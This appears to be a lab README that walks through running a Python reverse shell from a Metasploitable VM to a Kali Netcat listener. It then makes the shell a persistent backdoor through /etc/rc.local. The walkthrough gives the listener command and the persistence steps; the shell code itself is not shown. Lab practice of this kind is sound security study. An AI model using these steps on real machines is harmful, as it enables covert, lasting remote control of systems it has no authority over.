# Reverse-Shell
Write, set up, and execute a reverse shell in Python on Kali Linux and Metasploitable VM's, and automate this process creating a persistent backdoor.

!!Make sure that Both VM's can communicate with eachother on a secure network!!

On Kali, start a Netcat listener on port 7777: nc -lvnp 7777

  This tells Netcat to listen verbosely on port 7777 and not to close the connection.

On Metasploitable machine, create a Python script: sudo nano reverse_shell.py

  Write or paste the committed code in this file; save and exit the editor.

  Run "python reverse_shell.py" 

A connection should be established on Kali's Netcat listener, providing an interactive shell to the Metasploitable VM.

How to automate this process:

  Open the rc.local file: sudo nano /etc/rc.local

  Before the exit 0 line, add: python /path/to/your/reverse_shell.py &

  In my case: python /home/msfadmin/yannos/reverse_shell.py &

  The "&" makes sure it runs in the background.

Make the script executable: 

  sudo chmod +x /path/to/your/reverse_shell.py

  In my case: sudo chmod +x /home/msfadmin/yannos/reverse_shell.py

  Make sure rc.local is executable: sudo chmod +x /etc/rc.local

  Reboot and start the listener on Kali.

The shell should automatically establish on the listener upon reboot of Metasploitable VM.
